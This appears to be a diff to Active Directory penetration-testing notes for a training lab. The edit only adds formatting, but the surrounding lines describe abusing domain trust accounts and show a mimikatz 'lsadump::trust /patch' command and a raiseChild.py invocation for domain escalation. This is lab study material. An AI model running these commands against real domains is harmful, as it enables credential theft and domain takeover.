@@ -178,7 +178,7 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 ## Abusing Trust Account$  
 - When an Active Directory domain or forest trust is set up from a domain B to a domain A (B trusts A), a trust account is created in domain A, named B$.
 - Accessing Resources on a Trusted Domain (ex: LOGISTICS.INLANEFREIGHT.LOCAL) from a Trusting Domain (ex: INLANEFREIGHT.LOCAL)
-- these hashes are for `INLANEFREIGHT.LOCAL\INLANEFREIGHT$` trusted account in trusted (LOGISTICS.INLANEFREIGHT.LOCAL) domain to access the trusting domain ( INLANEFREIGHT.LOCAL) 
+- these hashes are for `INLANEFREIGHT.LOCAL\INLANEFREIGHT$` trusted account in trusted `LOGISTICS.INLANEFREIGHT.LOCAL` domain to access the trusting domain `INLANEFREIGHT.LOCAL` 
 
 ```powershell
 mimikatz.exe "privilege::debug" "lsadump::trust  /patch"
